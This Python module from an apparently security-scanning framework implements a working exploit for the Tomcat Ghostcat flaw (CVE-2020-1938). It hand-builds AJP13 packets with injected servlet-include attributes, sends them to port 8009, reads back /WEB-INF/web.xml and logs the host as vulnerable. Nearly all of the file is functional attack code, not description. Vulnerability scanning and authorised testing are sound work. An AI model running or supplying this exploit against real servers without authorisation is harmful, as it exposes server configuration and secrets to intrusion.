import os.path

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds
from lib.httpscan.http import HTTP

import urllib.parse
import socket


class Module:
    name = 'Ghostcat'
    description = 'Attempt to exploit the Tomcat LFI (CVE-2020-1938)'

    def run(self, target, args, useragent, proxy, timeout, safe):
        http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)

        url = "%s://%s:%d%s" % (target['method'], target['hostname'], target['port'], target['path'])

        file_data = ajpShooter(url, '/WEB-INF/web.xml').shoot()

        if file_data and file_data.startswith("<?xml"):
            Output.vuln({'target': http.url(target['path']), 'message': 'Vulnerable to Ghostcat (CVE-2020-1938)'})

            vuln_info = {
                'hostname': target['hostname'],
                'port': target['port'],
                'service': 'http',
                'url': http.url(target['path']),
                'name': 'Ghostcat (CVE-2020-1938)',
                'description':  '%s is vulnerable to Ghostcat (CVE-2020-1938)' % http.url(target['path']),
            }
            DB.insert_vulnerability(vuln_info)


class ajpRequest(object):
    def __init__(self, request_url, method='GET', headers=[], attributes=[]):
        self.request_url = request_url
        self.method = method
        self.headers = headers
        self.attributes = attributes

    def method2code(self, method):
        methods = {
            'OPTIONS': 1,
            'GET': 2,
            'HEAD': 3,
            'POST': 4,
            'PUT': 5,
            'DELETE': 6,
            'TRACE': 7,
            'PROPFIND': 8
        }
        code = methods.get(method, 2)
        return code

    def make_headers(self):
        header2code = {
            b'accept': b'\xA0\x01',  # SC_REQ_ACCEPT
            b'accept-charset': b'\xA0\x02',  # SC_REQ_ACCEPT_CHARSET
            b'accept-encoding': b'\xA0\x03',  # SC_REQ_ACCEPT_ENCODING
            b'accept-language': b'\xA0\x04',  # SC_REQ_ACCEPT_LANGUAGE
            b'authorization': b'\xA0\x05',  # SC_REQ_AUTHORIZATION
            b'connection': b'\xA0\x06',  # SC_REQ_CONNECTION
            b'content-type': b'\xA0\x07',  # SC_REQ_CONTENT_TYPE
            b'content-length': b'\xA0\x08',  # SC_REQ_CONTENT_LENGTH
            b'cookie': b'\xA0\x09',  # SC_REQ_COOKIE
            b'cookie2': b'\xA0\x0A',  # SC_REQ_COOKIE2
            b'host': b'\xA0\x0B',  # SC_REQ_HOST
            b'pragma': b'\xA0\x0C',  # SC_REQ_PRAGMA
            b'referer': b'\xA0\x0D',  # SC_REQ_REFERER
            b'user-agent': b'\xA0\x0E'  # SC_REQ_USER_AGENT
        }
        headers_ajp = []

        for (header_name, header_value) in self.headers:
            code = header2code.get(header_name, b'')
            if code != b'':
                headers_ajp.append(code)
                headers_ajp.append(self.ajp_string(header_value))
            else:
                headers_ajp.append(self.ajp_string(header_name))
                headers_ajp.append(self.ajp_string(header_value))

        return self.int2byte(len(self.headers), 2), b''.join(headers_ajp)

    def make_attributes(self):
        '''
        org.apache.catalina.jsp_file
        javax.servlet.include.servlet_path + javax.servlet.include.path_info
        '''
        attribute2code = {
            b'remote_user': b'\x03',
            b'auth_type': b'\x04',
            b'query_string': b'\x05',
            b'jvm_route': b'\x06',
            b'ssl_cert': b'\x07',
            b'ssl_cipher': b'\x08',
            b'ssl_session': b'\x09',
            b'req_attribute': b'\x0A',  # Name (the name of the attribut follows)
            b'ssl_key_size': b'\x0B'
        }
        attributes_ajp = []

        for (name, value) in self.attributes:
            code = attribute2code.get(name, b'')
            if code != b'':
                attributes_ajp.append(code)
                if code == b'\x0A':
                    for v in value:
                        attributes_ajp.append(self.ajp_string(v))
                else:
                    attributes_ajp.append(self.ajp_string(value))

        return b''.join(attributes_ajp)

    def ajp_string(self, message_bytes):
        # an AJP string
        # the length of the string on two bytes + string + plus two null bytes
        message_len_int = len(message_bytes)
        return self.int2byte(message_len_int, 2) + message_bytes + b'\x00'

    def int2byte(self, data, byte_len=1):
        return data.to_bytes(byte_len, 'big')

    def make_forward_request_package(self):
        '''
        AJP13_FORWARD_REQUEST :=
            prefix_code      (byte) 0x02 = JK_AJP13_FORWARD_REQUEST
            method           (byte)
            protocol         (string)
            req_uri          (string)
            remote_addr      (string)
            remote_host      (string)
            server_name      (string)
            server_port      (integer)
            is_ssl           (boolean)
            num_headers      (integer)
            request_headers *(req_header_name req_header_value)
            attributes      *(attribut_name attribute_value)
            request_terminator (byte) OxFF
        '''
        req_ob = urllib.parse.urlparse(self.request_url)

        # JK_AJP13_FORWARD_REQUEST
        prefix_code_int = 2
        prefix_code_bytes = self.int2byte(prefix_code_int)
        method_bytes = self.int2byte(self.method2code(self.method))
        protocol_bytes = b'HTTP/1.1'
        req_uri_bytes = req_ob.path.encode('utf8')
        remote_addr_bytes = b'127.0.0.1'
        remote_host_bytes = b'localhost'
        server_name_bytes = req_ob.hostname.encode('utf8')

        # SSL flag
        if req_ob.scheme == 'https':
            is_ssl_boolean = 1
        else:
            is_ssl_boolean = 0

        # port
        server_port_int = req_ob.port
        if not server_port_int:
            server_port_int = (is_ssl_boolean ^ 1) * 80 + (is_ssl_boolean ^ 0) * 443
        server_port_bytes = self.int2byte(server_port_int, 2)  # convert to a two bytes

        is_ssl_bytes = self.int2byte(is_ssl_boolean)  # convert to a one byte

        self.headers.append((b'host', b'%s:%d' % (server_name_bytes, server_port_int)))

        num_headers_bytes, headers_ajp_bytes = self.make_headers()

        attributes_ajp_bytes = self.make_attributes()

        message = []
        message.append(prefix_code_bytes)
        message.append(method_bytes)
        message.append(self.ajp_string(protocol_bytes))
        message.append(self.ajp_string(req_uri_bytes))
        message.append(self.ajp_string(remote_addr_bytes))
        message.append(self.ajp_string(remote_host_bytes))
        message.append(self.ajp_string(server_name_bytes))
        message.append(server_port_bytes)
        message.append(is_ssl_bytes)
        message.append(num_headers_bytes)
        message.append(headers_ajp_bytes)
        message.append(attributes_ajp_bytes)
        message.append(b'\xff')
        message_bytes = b''.join(message)

        send_bytes = b'\x12\x34' + self.ajp_string(message_bytes)

        return send_bytes


class ajpResponse(object):
    def __init__(self, s, out_file):
        self.sock = s
        self.out_file = out_file
        self.body_start = False
        self.common_response_headers = {
            b'\x01': b'Content-Type',
            b'\x02': b'Content-Language',
            b'\x03': b'Content-Length',
            b'\x04': b'Date',
            b'\x05': b'Last-Modified',
            b'\x06': b'Location',
            b'\x07': b'Set-Cookie',
            b'\x08': b'Set-Cookie2',
            b'\x09': b'Servlet-Engine',
            b'\x0a': b'Status',
            b'\x0b': b'WWW-Authenticate',
        }
        if not self.out_file:
            self.out_file = False
        else:
            #log('*', 'store response in %s' % self.out_file)
            self.out = open(self.out_file, 'wb')

    def parse_response(self, data=None):
        #log('debug', 'start')

        magic = self.recv(2)  # first two bytes are the 'magic'
        #log('debug', 'magic', magic, binascii.b2a_hex(magic))
        # next two bytes are the length
        data_len_int = self.read_int(2)

        code_int = self.read_int(1)
        #log('debug', 'code', code_int)

        if code_int == 3:
            data = self.parse_send_body_chunk()
        elif code_int == 4:
            self.parse_headers()
        elif code_int == 5:
            self.parse_response_end()
            return data

        return self.parse_response(data=data)

    def parse_headers(self):
        #log("append", '\n')
        #log('debug', 'parsing RESPONSE HEADERS')

        status_int = self.read_int(2)
        msg_bytes = self.read_string()

        #log('<', status_int, msg_bytes.decode('utf8'))

        headers_number_int = self.read_int(2)
        #log('debug', 'headers_nb', headers_number_int)

        for i in range(headers_number_int):
            # header name: two cases
            first_byte = self.recv(1)
            second_byte = self.recv(1)

            if first_byte == b'\xa0':
                header_key_bytes = self.common_response_headers[second_byte]
            else:
                header_len_bytes = first_byte + second_byte
                header_len_int = int.from_bytes(header_len_bytes, byteorder='big')
                header_key_bytes = self.read_bytes(header_len_int)
                # consume the 0x00 terminator
                self.recv(1)

            header_value_bytes = self.read_string()
            try:
                header_key_bytes = header_key_bytes.decode('utf8')
                header_value_bytes = header_value_bytes.decode('utf8')
            except:
                pass
            #log('<', '%s: %s' % (header_key_bytes, header_value_bytes))

    def parse_send_body_chunk(self):
        if not self.body_start:
            #log('append', '\n')
            #log('debug', 'start parsing body chunk')
            self.body_start = True
        chunk = self.read_string()
        if self.out_file:
            self.out.write(chunk)
        else:
            try:
                chunk = chunk.decode('utf8')
            except:
                pass

            #log('append', chunk)
        return chunk

    def parse_response_end(self):
        #log('debug', 'start parsing end')
        code_reuse_int = self.read_int(1)
        #log('debug', "finish parsing end", code_reuse_int)
        self.sock.close()

    def read_int(self, int_len):
        return int.from_bytes(self.recv(int_len), byteorder='big')

    def read_bytes(self, bytes_len):
        return self.recv(bytes_len)

    def read_string(self, int_len=2):
        data_len = self.read_int(int_len)
        data = self.recv(data_len)
        # consume the 0x00 terminator
        end = self.recv(1)
        #log('debug', 'read_string read data_len:%d\ndata_len:%d\nend:%s' % (data_len, len(data), end))
        return data

    def recv(self, data_len):
        data = self.sock.recv(data_len)
        while len(data) < data_len:
            #log('debug', 'recv not end,wait for %d bytes' % (data_len - len(data)))
            data += self.sock.recv(data_len - len(data))
        return data


class ajpShooter(object):
    def __init__(self, url, target_file):
        self.headers = 'append'
        self.ajp_port = 8009
        self.requesturl = url
        self.target_file = target_file
        self.shooter = 'read'
        self.method = 'GET'
        self.out_file = None

    def shoot(self):
        headers = self.transform_headers()

        target_file = self.target_file.encode('utf8')

        attributes = []
        evil_req_attributes = [
            (b'javax.servlet.include.request_uri', b'index'),
            (b'javax.servlet.include.servlet_path', target_file)
        ]

        for req_attr in evil_req_attributes:
            attributes.append((b"req_attribute", req_attr))

        if self.shooter == 'read':
            self.requesturl += '/index.txt'
        else:
            self.requesturl += '/index.jsp'

        ajp_ip = urllib.parse.urlparse(self.requesturl).hostname

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ajp_ip, self.ajp_port))

            message = ajpRequest(self.requesturl, self.method, headers, attributes).make_forward_request_package()
            s.send(message)

            return ajpResponse(s, self.out_file).parse_response()
        except TimeoutError:
            pass
        except OSError:
            pass

    def transform_headers(self):
        self.headers = [] if not self.headers else self.headers
        newheaders = []
        for header in self.headers:
            hsplit = header.split(':')
            hname = hsplit[0]
            hvalue = ':'.join(hsplit[1:])
            newheaders.append((hname.lower().encode('utf8'), hvalue.encode('utf8')))

        return newheaders





